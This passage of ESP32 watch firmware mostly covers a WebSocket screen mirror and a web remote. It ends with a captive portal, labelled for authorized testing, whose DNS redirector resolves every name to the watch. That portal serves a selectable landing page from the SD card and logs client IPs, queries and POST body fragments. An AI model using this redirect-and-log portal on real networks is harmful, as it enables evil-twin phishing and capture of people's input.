    mir_state_frames(now);
    mir_pump_all();
    mir_adapt(now);
    mir_pace(now);
    /* pending = a cursor is mid-send, or a client owes a frame that exists / a keyframe */
    bool pending = false, sending = false;
    taskENTER_CRITICAL(&s_ws_mux);
    for (int i = 0; i < COMP_WS_MAX; i++) {
        if (s_ws_fds[i] == 0) continue;
        if (s_ws_tx[i].total != 0) sending = true;
        if (s_ws_tx[i].total != 0 || s_ws_tx[i].need_full) { pending = true; continue; }
        for (int b = 0; b < MIR_BUFS; b++) if (s_mb[b].len > 0 && s_mb[b].seq > s_ws_tx[i].last_seq) { pending = true; break; }
    }
    taskEXIT_CRITICAL(&s_ws_mux);
    s_mir_sending = sending;
    if (!pending) s_mir_progress_us = now;                 /* nothing owed: the watchdog has nothing to time */
    else if (now - s_mir_progress_us > 1500000) {          /* owed for 1.5 s with nothing moving: say why (rate-limited) */
        static int64_t s_dump_us;
        if (now - s_dump_us > 2000000) { s_dump_us = now; mir_dump("no progress for 1.5 s"); }
    }
    s_mir_pending = pending;
}

static void mir_task(void *arg)
{
    (void)arg;
    for (;;) {
        const bool busy = s_mir_enabled && nocsif_wifi_companion_ws_clients() > 0;
        /* Wake for a kick (a capture finished / something changed), else: while a frame is still draining into
         * a full socket every MIR_ROUND_SLEEP_MS (a 50 ms poll held a keyframe's tail back 50 ms), at the moment
         * the pacing interval ends (not at the next 50 ms poll), otherwise every MIR_TICK_MS. */
        TickType_t wait = pdMS_TO_TICKS(busy ? MIR_TICK_MS : 500);
        if (busy && s_mir_sending) {
            wait = 0;
        } else if (busy && !s_mir_paused) {
            const int64_t due = s_mir_last_arm_us + mir_eff_interval_us(esp_timer_get_time()) - esp_timer_get_time();
            if (due > 0 && due < (int64_t)MIR_TICK_MS * 1000) wait = pdMS_TO_TICKS((uint32_t)(due / 1000) + 1);
        }
        if (wait) ulTaskNotifyTake(pdTRUE, wait);
        if (!s_mir_enabled || !s_comp_httpd) continue;
        if (xSemaphoreTake(s_mir_lock, pdMS_TO_TICKS(100)) != pdTRUE) continue;
        if (s_mir_enabled && s_comp_httpd) mir_round();
        xSemaphoreGive(s_mir_lock);
        /* A notification from the LVGL tick can make the wait above return at once, and an always-dirty
         * screen (the Home ring) makes every round do work — so without this unconditional block the
         * task never sleeps, core 0's IDLE task starves and the task watchdog reboots the watch
         * (recorded twice on 2026-10-11: `task-wdt task=mirror` in the JPEG encoder, and once naming
         * the equal-priority buttons task). Pacing alone is not a guarantee; this is. */
        vTaskDelay(pdMS_TO_TICKS(MIR_ROUND_SLEEP_MS));
    }
}

/* §4.8a — the UI's mirror tick kicks this when its dirty list is non-empty (the task also polls every
 * MIR_TICK_MS while clients are connected; the kick just trims latency). Lock-free. */
void nocsif_wifi_companion_frame_ready(uint32_t seq)
{
    (void)seq;
    mir_kick();
}

void nocsif_wifi_mirror_stats(nocsif_mirror_stats_t *out)
{
    if (!out) return;
    *out = s_mir_st;
    out->quality     = (uint32_t)s_mir_q;
    out->clients     = (uint32_t)nocsif_wifi_companion_ws_clients();
    out->interval_ms = (uint32_t)(s_mir_interval_us / 1000);
    nocsif_ui_lvgl_tick_stats(&out->lvgl_avg_x10, &out->lvgl_max_ms);
    out->paused      = s_mir_paused ? 1 : 0;
    out->prio        = (uint32_t)(s_mir_task ? uxTaskPriorityGet(s_mir_task) : (UBaseType_t)s_mir_prio);
    out->lag_hi_ms   = (uint32_t)s_mir_lag_hi;
    out->lag_lo_ms   = (uint32_t)s_mir_lag_lo;
    out->tos         = (uint32_t)s_mir_tos;
    out->captures    = nocsif_ui_mirror_captures();
    out->sub         = s_mir_sub == JPEG_SUBSAMPLE_420 ? 420 : 422;
    out->blk         = (uint32_t)s_mir_blk;
    out->imem        = nocsif_jpeg_mem_internal_on() ? 1 : 0;
    out->fwd_floor_ms = (uint32_t)s_mir_fwd_floor_ms;
    out->fwd_pps     = s_mir_fwd_pps;
    out->codec       = (uint32_t)s_mir_codec;
    out->nodelay     = (uint32_t)s_mir_nodelay;
    int diff = 1, early = 1;
    nocsif_ui_mirror_knob_state(&diff, &early);
    out->diff        = (uint32_t)diff;
    out->early       = (uint32_t)early;
    out->tap_us_s    = nocsif_ui_mirror_tap_us();
    out->txb         = (uint32_t)s_mir_txb;
    out->idle_ms     = (uint32_t)s_mir_idle_ms;
}

void nocsif_wifi_mirror_idle(int ms)
{
    if (ms >= 0 && ms <= 2000) s_mir_idle_ms = ms;
    ESP_LOGW(TAG, "mirror: idle capture spacing %d ms (0 = off)", s_mir_idle_ms);
}

void nocsif_wifi_mirror_txb(int bytes)
{
    if (bytes >= 0 && bytes <= 65536) s_mir_txb = bytes;
    ESP_LOGW(TAG, "mirror: write budget %d B per client per round (0 = none)", s_mir_txb);
}

void nocsif_wifi_mirror_path(int codec, int diff, int early, int nodelay)
{
    if (codec == 0 || codec == 1) {
        if (codec != s_mir_codec) s_mir_force_full = true;   /* the page switches painters: start from a whole screen */
        s_mir_codec = codec;
    }
    if (nodelay == 0 || nodelay == 1) s_mir_nodelay = nodelay;
    nocsif_ui_mirror_knobs(diff, early);
    int d = 1, e = 1;
    nocsif_ui_mirror_knob_state(&d, &e);
    ESP_LOGW(TAG, "mirror: path codec=%s diff=%d early=%d nodelay=%d (next viewer)", s_mir_codec ? "NQ" : "JPEG", d, e, s_mir_nodelay);
    mir_kick();
}


void nocsif_wifi_mirror_fwd_floor(int ms)
{
    if (ms >= 0 && ms <= 2000) s_mir_fwd_floor_ms = ms;
    s_mir_pace_us = 0;
    ESP_LOGW(TAG, "mirror: while the hotspot forwards >= %d pkt/s, frames at least %d ms apart (0 = no cap)",
             MIR_FWD_BUSY_PPS, s_mir_fwd_floor_ms);
}

void nocsif_wifi_mirror_codec(int sub, int blk)
{
    if (sub == 1 || sub == 0) {              /* imem knob rides here: 1 = encoder working set internal-first */
        nocsif_jpeg_mem_internal(sub == 1);
        if (s_mir_lock && xSemaphoreTake(s_mir_lock, pdMS_TO_TICKS(1500)) == pdTRUE) {
            if (s_enc) { jpeg_enc_close(s_enc); s_enc = NULL; }   /* reopen in the new memory at the next frame */
            xSemaphoreGive(s_mir_lock);
        }
    }
    if (sub == 420) s_mir_sub = JPEG_SUBSAMPLE_420;
    if (sub == 422) s_mir_sub = JPEG_SUBSAMPLE_422;
    if (blk == 0 || blk == 1) s_mir_blk = blk;
    s_mir_force_full = true;                              /* the next frame re-paints everything in the new mode */
    ESP_LOGW(TAG, "mirror: codec %s, %s", s_mir_sub == JPEG_SUBSAMPLE_420 ? "4:2:0" : "4:2:2",
             s_mir_blk ? "stripes" : "whole-rect snapshot");
    mir_kick();
}

void nocsif_wifi_mirror_pace(int hi_ms, int lo_ms, int tos)
{
    if (hi_ms > 0) s_mir_lag_hi = hi_ms;
    if (lo_ms > 0) s_mir_lag_lo = lo_ms;
    if (s_mir_lag_lo >= s_mir_lag_hi) s_mir_lag_lo = s_mir_lag_hi - 5;
    if (tos >= 0 && tos <= 0xFF) s_mir_tos = tos;
    s_mir_pace_us = 0;                                    /* re-pace at the next round */
    ESP_LOGW(TAG, "mirror: pace hi=%d lo=%d ms (LVGL timer average), tos=0x%02x for new viewers", s_mir_lag_hi,
             s_mir_lag_lo, s_mir_tos);
}

void nocsif_wifi_mirror_tune(int fps, int q, int pause, int prio)
{
    if (fps >= 0)   { s_mir_fps_cap = fps > 30 ? 30 : fps; s_mir_pace_us = 0; }   /* never above the 33 ms floor */
    if (q >= 0)     { s_mir_q_fixed = (q >= MIR_Q_MIN && q <= MIR_Q_MAX) ? q : 0; if (s_mir_q_fixed) s_mir_q = s_mir_q_fixed; }
    if (pause >= 0) { s_mir_paused = (pause != 0); if (!s_mir_paused) s_mir_force_full = true; }
    if (prio >= MIR_PRIO_MIN && prio <= MIR_PRIO_MAX) {   /* live A/B of the task's priority (not persisted) */
        s_mir_prio = prio;
        if (s_mir_task) vTaskPrioritySet(s_mir_task, (UBaseType_t)prio);
    }
    ESP_LOGW(TAG, "mirror: tune fps_cap=%d q_fixed=%d paused=%d prio=%d", s_mir_fps_cap, s_mir_q_fixed, (int)s_mir_paused, s_mir_prio);
    mir_kick();
}

/* Bring the mirror task up (once; it then stays resident and idles when no surface is up). Returns false
 * if the task could not be created — the surface still serves control, just no picture. */
static bool mir_start(void)
{
    if (!s_mir_lock) s_mir_lock = xSemaphoreCreateMutex();
    if (!s_mir_lock) return false;
    if (!s_mb) s_mb = heap_caps_calloc(MIR_BUFS, sizeof *s_mb, MALLOC_CAP_SPIRAM);   /* CPU-only tables: PSRAM */
    if (!s_mir_carry) s_mir_carry = heap_caps_calloc(NOCSIF_MIR_TROWS, sizeof *s_mir_carry, MALLOC_CAP_SPIRAM);
    if (!s_mb || !s_mir_carry) { ESP_LOGE(TAG, "mirror: frame tables alloc failed"); return false; }
    if (!s_mir_task) {
        if (xTaskCreatePinnedToCoreWithCaps(mir_task, "mirror", MIR_TASK_STACK, NULL, (UBaseType_t)s_mir_prio, &s_mir_task,
                                            0, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT) != pdPASS) {
            s_mir_task = NULL;
            ESP_LOGE(TAG, "mirror: task create failed");
            return false;
        }
    }
    taskENTER_CRITICAL(&s_ws_mux);
    for (int b = 0; b < MIR_BUFS; b++) { s_mb[b].len = 0; s_mb[b].seq = 0; s_mb[b].from = 0; }
    memset(s_mir_carry, 0, NOCSIF_MIR_TROWS * sizeof *s_mir_carry);   /* a keyframe follows: nothing is owed */
    taskEXIT_CRITICAL(&s_ws_mux);
    s_mir_seq = 0;
    s_mir_force_full = true;
    s_mir_pending = false;
    s_mir_backoff_until_us = 0;
    s_mir_progress_us = esp_timer_get_time();
    s_mir_enabled = true;
    return true;
}

/* Park the mirror task before the httpd goes down: no socket is touched once this returns (a round in
 * progress — at most one encode, a few hundred ms — is waited out), and the client table is cleared. */
static void mir_stop(void)
{
    s_mir_enabled = false;
    if (s_mir_lock) xSemaphoreTake(s_mir_lock, pdMS_TO_TICKS(1500));
    taskENTER_CRITICAL(&s_ws_mux);
    memset(s_ws_fds, 0, sizeof s_ws_fds);
    if (s_ws_tx) {
        for (int i = 0; i < COMP_WS_MAX; i++) { uint32_t g = s_ws_tx[i].gen + 1; memset(&s_ws_tx[i], 0, sizeof s_ws_tx[i]); s_ws_tx[i].gen = g; s_ws_tx[i].buf = -1; }
    }
    taskEXIT_CRITICAL(&s_ws_mux);
    if (s_enc) { jpeg_enc_close(s_enc); s_enc = NULL; }
    if (s_mir_lock) xSemaphoreGive(s_mir_lock);
}

static void companion_mdns_up(void)
{
    if (s_mdns_up) {
        return;
    }
    const size_t int_before = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    if (mdns_init() != ESP_OK) {
        ESP_LOGW(TAG, "companion: mdns_init failed (nocsif.local unavailable; use the AP IP)");
        return;
    }
    mdns_hostname_set(COMP_HOST);
    mdns_instance_name_set("NocSif web remote");
    mdns_service_add(NULL, "_http", "_tcp", 80, NULL, 0);
    s_mdns_up = true;
    ESP_LOGI(TAG, "companion: mDNS up — internal free %u -> %u B", (unsigned)int_before,
             (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
}

static void companion_mdns_down(void)
{
    if (!s_mdns_up) {
        return;
    }
    mdns_free();
    s_mdns_up = false;
}

static void companion_httpd_up(void)
{
    if (s_comp_httpd) {
        return;
    }
    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.server_port      = 80;
    hc.stack_size       = 8192;
    hc.task_caps        = MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT;   /* P4: a PSRAM stack, see the note in the file header */
    hc.max_uri_handlers = 20;
    hc.max_open_sockets = 5;    /* the page: 1 WebSocket + a fetch or two; each open session costs internal RAM
                                 * (default 7). LRU purge below recycles the oldest when a 6th arrives. */
    hc.lru_purge_enable = true;
    /* §4.8a mirror: the per-frame JPEG encode runs on THIS httpd task (tens of ms), and the SAME task
     * serves the WS uplink (phone touch points) — so it must never be starved. Left unpinned at prio 5 it
     * could land on the LVGL core and stutter the watch; dropped to prio 3 (the first fix) it sat behind
     * WiFi/lwip/LVGL in both directions — touch points arrived in bursts (swipes read as taps) and frames
     * took seconds. The right split is by CORE, not priority: this task lives on core 0 with WiFi/lwip at
     * the normal httpd priority, and the LVGL task is pinned to core 1 (nocsif_ui_init) — render and
     * encode never contend for a core, and the uplink stays prompt. */
    hc.core_id          = 0;
    hc.task_priority    = tskIDLE_PRIORITY + 5;
    const size_t int_before = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    /* The server's own blocks (session table, request scratch, the URI table and its strings) are plain
     * malloc()s under the 4 KB internal-first threshold — ~3.5 KB of internal RAM for data only the
     * PSRAM-stacked httpd task touches. Measured 2026-10-11: surface up = −4.2 KB internal, the margin the
     * Wi-Fi driver's RX bursts then lack. Drop the threshold for the bring-up so they land in PSRAM (lwIP's
     * queues and semaphores ask for internal RAM explicitly and are unaffected). */
    const size_t ext_was = nocsif_memdiag_extmem_get();
    nocsif_memdiag_extmem_set(0);
    if (httpd_start(&s_comp_httpd, &hc) != ESP_OK) {
        nocsif_memdiag_extmem_set(ext_was);
        s_comp_httpd = NULL;
        ESP_LOGE(TAG, "companion: httpd_start failed");
        return;
    }
    httpd_uri_t root   = { .uri = "/",            .method = HTTP_GET,  .handler = comp_root_get };
    httpd_uri_t ping   = { .uri = "/api/ping",    .method = HTTP_GET,  .handler = comp_ping_get };
    httpd_uri_t blob   = { .uri = "/api/blob",    .method = HTTP_GET,  .handler = comp_blob_get };   /* downlink probe */
    httpd_uri_t menu   = { .uri = "/api/menu",    .method = HTTP_GET,  .handler = comp_menu_get };
    httpd_uri_t launch = { .uri = "/api/launch",  .method = HTTP_POST, .handler = comp_launch_post };
    httpd_uri_t type   = { .uri = "/api/type",    .method = HTTP_POST, .handler = comp_type_post };
    httpd_uri_t key    = { .uri = "/api/key",     .method = HTTP_POST, .handler = comp_key_post };
    httpd_uri_t back   = { .uri = "/api/back",    .method = HTTP_POST, .handler = comp_back_post };
    httpd_uri_t home   = { .uri = "/api/home",    .method = HTTP_POST, .handler = comp_home_post };
    httpd_uri_t bright = { .uri = "/api/brightness", .method = HTTP_POST, .handler = comp_brightness_post };
    httpd_uri_t vol    = { .uri = "/api/volume",  .method = HTTP_POST, .handler = comp_volume_post };
    httpd_uri_t ws     = { .uri = "/ws", .method = HTTP_GET, .handler = comp_ws_handler, .is_websocket = true };
    httpd_uri_t fs     = { .uri = "/api/fs",     .method = HTTP_GET,  .handler = comp_fs_list_get };     /* P4 */
    httpd_uri_t file   = { .uri = "/api/file",   .method = HTTP_GET,  .handler = comp_fs_file_get };
    httpd_uri_t upload = { .uri = "/api/upload", .method = HTTP_POST, .handler = comp_fs_upload_post };
    httpd_uri_t del    = { .uri = "/api/delete", .method = HTTP_POST, .handler = comp_fs_delete_post };
    httpd_register_uri_handler(s_comp_httpd, &root);
    httpd_register_uri_handler(s_comp_httpd, &ping);
    httpd_register_uri_handler(s_comp_httpd, &blob);
    httpd_register_uri_handler(s_comp_httpd, &menu);
    httpd_register_uri_handler(s_comp_httpd, &launch);
    httpd_register_uri_handler(s_comp_httpd, &type);
    httpd_register_uri_handler(s_comp_httpd, &key);
    httpd_register_uri_handler(s_comp_httpd, &back);
    httpd_register_uri_handler(s_comp_httpd, &home);
    httpd_register_uri_handler(s_comp_httpd, &bright);
    httpd_register_uri_handler(s_comp_httpd, &vol);
    httpd_register_uri_handler(s_comp_httpd, &ws);
    httpd_register_uri_handler(s_comp_httpd, &fs);
    httpd_register_uri_handler(s_comp_httpd, &file);
    httpd_register_uri_handler(s_comp_httpd, &upload);
    httpd_register_uri_handler(s_comp_httpd, &del);
    nocsif_memdiag_extmem_set(ext_was);
    ESP_LOGI(TAG, "companion: httpd up — internal free %u -> %u B", (unsigned)int_before,
             (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));

    /* The live mirror: per-client send cursors (PSRAM) + the resident mirror task (encode + send, core 0). */
    if (!s_ws_tx) s_ws_tx = heap_caps_calloc(COMP_WS_MAX, sizeof *s_ws_tx, MALLOC_CAP_SPIRAM);
    taskENTER_CRITICAL(&s_ws_mux);
    memset(s_ws_fds, 0, sizeof s_ws_fds);
    if (s_ws_tx) for (int i = 0; i < COMP_WS_MAX; i++) { uint32_t g = s_ws_tx[i].gen + 1; memset(&s_ws_tx[i], 0, sizeof s_ws_tx[i]); s_ws_tx[i].gen = g; s_ws_tx[i].buf = -1; }
    taskEXIT_CRITICAL(&s_ws_mux);
    const size_t int_mir = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    if (!s_ws_tx || !mir_start()) ESP_LOGW(TAG, "companion: live mirror unavailable (no memory / task) — control only");
    ESP_LOGI(TAG, "companion: mirror task up — internal free %u -> %u B", (unsigned)int_mir,
             (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
}

static void companion_httpd_down(void)
{
    mir_stop();                                       /* park the mirror task + clear the client table first */
    if (!s_comp_httpd) {
        return;
    }
    httpd_stop(s_comp_httpd);
    s_comp_httpd = NULL;
}

/* Drop the web-remote HTTP + mDNS layer — leaves whatever AP is up running (like portal_stop). Called
 * by ap_teardown (so ANY software-AP drop, e.g. a STA scan/join, removes the surface cleanly) and by
 * do_comp_remote_off. Idempotent. Does NOT tear an AP down (the gateway owns its hotspot). */
static void companion_stop(void)
{
    if (!s_comp_active && s_comp_httpd == NULL && !s_mdns_up) {
        return;
    }
    companion_httpd_down();
    companion_mdns_down();
    s_comp_active   = false;
    s_comp_remote   = false;   /* full surface teardown; the gateway tick re-asserts if it still wants it */
    ESP_LOGI(TAG, "web remote surface stopped");
}

/* §4.8a — bring the WEB SURFACE (httpd :80 + mDNS nocsif.local + the control/mirror handlers) up on the
 * AP the travel-router gateway already owns. This NEVER raises or reconfigures an AP of its own and NEVER
 * touches Bluetooth — it just attaches the server to the hotspot the gateway already beacons, so a phone
 * already joined can open nocsif.local and control/mirror the watch. No-op (logs) if no AP netif is up
 * yet (the gateway raises it first, via its need_ap); quietly deferred while the recon captive portal
 * holds port 80 (the gateway tick re-asserts once it stops). Idempotent. The mirror then self-gates on
 * s_comp_active + a /ws client. */
static void do_comp_remote_on(void)
{
    if (nocsif_reliability_safe_mode()) return;
    if (s_comp_remote || s_comp_active) { s_comp_remote = true; return; }   /* already serving */
    if (s_portal_active) return;                      /* the captive portal owns :80 for now */
    /* The surface costs ~4.7 KB of internal RAM (httpd ~2.9 KB, its URI table, the mirror task's TCB).
     * Raised into an already-squeezed pool it only buys `wifi:mem fail` and a dropped station; wait for
     * headroom instead — the gateway tick re-asserts it every second, so it comes up when memory allows. */
    {
        const size_t int_free = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_DMA);
        if (int_free < COMP_REMOTE_MIN_INT_FREE) {
            static int64_t s_last_log;
            const int64_t now = esp_timer_get_time();
            if (now - s_last_log > 10000000LL) {
                s_last_log = now;
                ESP_LOGW(TAG, "companion remote deferred: internal RAM %u B free (needs %u)", (unsigned)int_free,
                         (unsigned)COMP_REMOTE_MIN_INT_FREE);
            }
            return;
        }
    }
    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap == NULL) {                                 /* no hotspot up — the gateway must raise it first */
        ESP_LOGW(TAG, "companion remote: no AP up (enable a Travel Router hotspot capability first)");
        return;
    }
    s_ap_netif = ap;
    esp_netif_ip_info_t ipi;
    if (esp_netif_get_ip_info(ap, &ipi) == ESP_OK) {
        snprintf(s_ap_ip, sizeof s_ap_ip, IPSTR, IP2STR(&ipi.ip));
    }
    companion_mdns_up();
    companion_httpd_up();
    if (s_comp_httpd == NULL) {                       /* HTTP is mandatory */
        companion_mdns_down();
        ESP_LOGE(TAG, "companion remote: httpd failed to start");
        return;
    }
    s_comp_active  = true;
    s_comp_remote  = true;
    ESP_LOGW(TAG, "companion web remote ON (riding the Travel Router hotspot): http=80 mdns=%s ip %s; "
                  "int-dma free=%u largest=%u", s_mdns_up ? "up" : "off", s_ap_ip[0] ? s_ap_ip : "?",
             (unsigned)nocsif_int_dma_free(), (unsigned)nocsif_int_dma_largest());
    refresh_strings();
}

/* Drop the web surface that do_comp_remote_on raised. Leaves the gateway's AP + the STA link alone (the
 * gateway owns them). */
static void do_comp_remote_off(void)
{
    if (!s_comp_remote) return;
    s_comp_remote = false;
    companion_stop();                                 /* httpd + mDNS down; AP left to the gateway */
    ESP_LOGI(TAG, "companion web remote OFF (Travel Router hotspot kept)");
    refresh_strings();
}

/* Published companion state — safe to read from the LVGL task, since
 * it's written only by the worker with a single writer and the
 * s_comp_active flag acting as a barrier, mirroring the portal getters. */
bool        nocsif_wifi_companion_active(void)  { return s_comp_active; }
const char *nocsif_wifi_companion_url(void)     { return s_mdns_up ? "nocsif.local" : (s_ap_ip[0] ? s_ap_ip : "nocsif.local"); }

/* §4.8a — Travel Router "Control": serve the web surface on the gateway's hotspot (no own AP, no BT
 * change). Driven by the gateway worker as its "remote" capability. Non-blocking (posted to the worker);
 * the getter is a RAM-cached flag safe on the LVGL task. */
void nocsif_wifi_companion_remote_set(bool on)
{
    if (s_q) {                                           /* posted to the worker (post() is defined below) */
        wifi_cmd_t c = { .type = on ? CMD_COMP_REMOTE_ON : CMD_COMP_REMOTE_OFF };
        xQueueSend(s_q, &c, 0);
    }
}
bool nocsif_wifi_companion_remote_active(void) { return s_comp_remote; }

/* ---- captive portal (M5-P5.4, active — authorized testing) ---- */

static const char PORTAL_DEFAULT_HTML[] =
    "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>NocSif</title></head><body style=\"font-family:sans-serif;background:#0d0d10;color:#d8d8dc;"
    "text-align:center;padding:2.4em 1.2em\"><h2>NocSif test access point</h2>"
    "<p>You have joined a software access point used for authorized network testing.</p>"
    "<p>No action is required.</p></body></html>";

/* Primes the selected landing-page filename from NVS once; safe to call more than once. "" means the built-in notice. */
static void portal_sel_ensure_loaded(void)
{
    if (s_portal_sel_loaded) {
        return;
    }
    s_portal_sel_loaded = true;
    char buf[PT_SEL_MAX];
    nocsif_settings_get_str(K_PT_PAGE, buf, sizeof buf, "");
    portENTER_CRITICAL(&s_portal_mux);
    snprintf(s_portal_page_sel, sizeof s_portal_page_sel, "%s", buf);
    portEXIT_CRITICAL(&s_portal_mux);
}

/* DNS redirector: answers every query with the AP's own IPv4, so a
 * client's connectivity probe resolves right back to the watch. Owns its
 * own socket, using a short rx timeout to poll the run flag periodically,
 * and closes and self-deletes on stop. A single-question query is the
 * common case; the answer is appended right after the echoed question. */
static void portal_dns_task(void *arg)
{
    (void)arg;
    int sock = s_dns_sock;
    uint32_t apip = 0;                                  /* the AP's IPv4, in network order */
    esp_netif_ip_info_t ip;
    if (s_ap_netif && esp_netif_get_ip_info(s_ap_netif, &ip) == ESP_OK) {
        apip = ip.ip.addr;
    }
    struct timeval tv = { .tv_sec = 0, .tv_usec = 400000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);

    uint8_t buf[512];
    while (s_dns_run) {
        struct sockaddr_in cli;
        socklen_t cl = sizeof cli;
        int n = recvfrom(sock, buf, sizeof buf, 0, (struct sockaddr *)&cli, &cl);
        if (n < 12 || n + 16 > (int)sizeof buf) {       /* a timeout (-1), a runt packet, or no room to answer: re-poll */
            continue;
        }
        buf[2] |= 0x80;                                 /* QR bit: this is a response */
        buf[3] = 0x00;                                  /* RA and RCODE cleared */
        buf[6] = 0x00; buf[7] = 0x01;                   /* ANCOUNT = 1 */
        buf[8] = buf[9] = buf[10] = buf[11] = 0x00;     /* NSCOUNT and ARCOUNT = 0 */
        int p = n;                                      /* the answer is appended right after the echoed question */
        buf[p++] = 0xC0; buf[p++] = 0x0C;               /* NAME: a pointer back to the question, at offset 12 */
        buf[p++] = 0x00; buf[p++] = 0x01;               /* TYPE A */
        buf[p++] = 0x00; buf[p++] = 0x01;               /* CLASS IN */
        buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x3C;   /* TTL: 60 seconds */
        buf[p++] = 0x00; buf[p++] = 0x04;               /* RDLENGTH: 4 */
        memcpy(&buf[p], &apip, 4); p += 4;              /* RDATA: the AP's IPv4 address */
        sendto(sock, buf, p, 0, (struct sockaddr *)&cli, cl);
    }
    close(sock);
    s_dns_sock = -1;
    s_dns_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

/* Loads the landing page from /sd once, on the httpd task (its 8 KB
 * stack has room for FATFS). Also picks a fresh portal-NNN.log name for
 * this session. Best-effort — falls back to the built-in notice page on
 * any failure. */
static void portal_load_page_once(void)
{
    bool go = false;
    portENTER_CRITICAL(&s_portal_mux);
    if (!s_portal_page_tried) { s_portal_page_tried = true; go = true; }
    portEXIT_CRITICAL(&s_portal_mux);
    if (!go || !s_portal_sd_ok) {
        return;
    }
    if (!nocsif_sdcard_lock(1000)) {
        return;
    }
    mkdir("/sd/nocsif", 0777);
    mkdir("/sd/nocsif/wifi", 0777);
    mkdir(PORTAL_DIR, 0777);
    for (int i = 0; i < 1000; i++) {                    /* the first unused portal-NNN.log name */
        char pth[64];
        snprintf(pth, sizeof pth, "/sd/nocsif/wifi/portal-%03d.log", i);
        FILE *t = fopen(pth, "r");
        if (t) { fclose(t); continue; }
        snprintf(s_portal_logpath, sizeof s_portal_logpath, "%s", pth);
        break;
    }

    char sel[PT_SEL_MAX];                               /* the chosen page's filename, copied outside the lock */
    portENTER_CRITICAL(&s_portal_mux);
    memcpy(sel, s_portal_page_sel, sizeof sel);
    portEXIT_CRITICAL(&s_portal_mux);

    if (sel[0]) {                                       /* "" means serve the built-in notice */
        char path[96];
        snprintf(path, sizeof path, "%s/%s", PORTAL_DIR, sel);
        FILE *f = fopen(path, "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            long sz = ftell(f);
            fseek(f, 0, SEEK_SET);
            if (sz > 0 && sz <= PORTAL_PAGE_MAX) {
                char *b = heap_caps_malloc((size_t)sz, MALLOC_CAP_SPIRAM);
                if (b) {
                    size_t rd = fread(b, 1, (size_t)sz, f);
                    s_portal_page = b;
                    s_portal_page_len = (int)rd;
                }
            }
            fclose(f);
        } else {
            ESP_LOGW(TAG, "portal: page %s not found; serving built-in", path);
        }
    }
    nocsif_sdcard_unlock();
}

/* Records one client interaction: into the RAM ring for the UI, and appended to the session log on /sd. */
static void portal_log_request(httpd_req_t *req, const char *method, const char *extra)
{
    char ips[16] = "?";
    int fd = httpd_req_to_sockfd(req);
    struct sockaddr_in6 sa;                             /* the buffer fits both v4 and v6 */
    socklen_t sl = sizeof sa;
    if (getpeername(fd, (struct sockaddr *)&sa, &sl) == 0 && sa.sin6_family == AF_INET) {
        struct sockaddr_in *s4 = (struct sockaddr_in *)&sa;
        uint32_t a = ntohl(s4->sin_addr.s_addr);
        snprintf(ips, sizeof ips, "%u.%u.%u.%u", (unsigned)((a >> 24) & 0xFF),
                 (unsigned)((a >> 16) & 0xFF), (unsigned)((a >> 8) & 0xFF), (unsigned)(a & 0xFF));
    }
    char q[48] = "";
    size_t ql = httpd_req_get_url_query_len(req);
    if (ql > 0 && ql < sizeof q) {
        httpd_req_get_url_query_str(req, q, sizeof q);
    }

    char line[PORTAL_LOG_LINE];
    snprintf(line, sizeof line, "%s %s %.24s%s%s%s%s", ips, method, req->uri,
             q[0] ? "?" : "", q,
             (extra && extra[0]) ? " " : "", (extra && extra[0]) ? extra : "");

    portENTER_CRITICAL(&s_portal_mux);
    snprintf(s_portal_log[s_portal_log_head], PORTAL_LOG_LINE, "%s", line);
    s_portal_log_head = (s_portal_log_head + 1) % PORTAL_LOG_MAX;
    if (s_portal_log_cnt < PORTAL_LOG_MAX) s_portal_log_cnt++;
    portEXIT_CRITICAL(&s_portal_mux);
    s_portal_hits++;
    s_portal_gen++;

    if (s_portal_sd_ok && s_portal_logpath[0] && nocsif_sdcard_lock(500)) {
        FILE *f = fopen(s_portal_logpath, "a");
        if (f) {
            fprintf(f, "%lu %s\n", (unsigned long)(esp_timer_get_time() / 1000), line);
            fclose(f);
        }
        nocsif_sdcard_unlock();
    }
}

/* The wildcard handler: serves the landing page for every path, so client OSes surface the portal sheet. */
static esp_err_t portal_http_req(httpd_req_t *req)
{
    portal_load_page_once();

    char extra[24] = "";
    if (req->method == HTTP_POST && req->content_len > 0) {
        char body[96];
        int want = (req->content_len < sizeof body - 1) ? (int)req->content_len : (int)(sizeof body - 1);
        int got = httpd_req_recv(req, body, want);
        if (got > 0) { body[got] = '\0'; snprintf(extra, sizeof extra, "%.20s", body); }
    }
    portal_log_request(req, req->method == HTTP_POST ? "POST" : "GET", extra);

    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_status(req, "200 OK");
    if (s_portal_page && s_portal_page_len > 0) {
        httpd_resp_send(req, s_portal_page, s_portal_page_len);
    } else {
        httpd_resp_send(req, PORTAL_DEFAULT_HTML, HTTPD_RESP_USE_STRLEN);
    }
    return ESP_OK;
}

static void portal_stop(void)
{
    if (!s_portal_active && s_httpd == NULL && s_dns_task == NULL && s_dns_sock < 0) {
        return;
    }
    s_portal_active = false;

    if (s_httpd) { httpd_stop(s_httpd); s_httpd = NULL; }   /* joins the httpd task, so there are no more handler calls */

    s_dns_run = false;                                      /* the DNS task exits within its own rx timeout */
    for (int i = 0; i < 20 && s_dns_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (s_dns_sock >= 0) { close(s_dns_sock); s_dns_sock = -1; }

    if (s_portal_page) { free(s_portal_page); s_portal_page = NULL; s_portal_page_len = 0; }
    if (s_portal_sd_ok) { nocsif_usb_gadget_release_sd(); s_portal_sd_ok = false; }
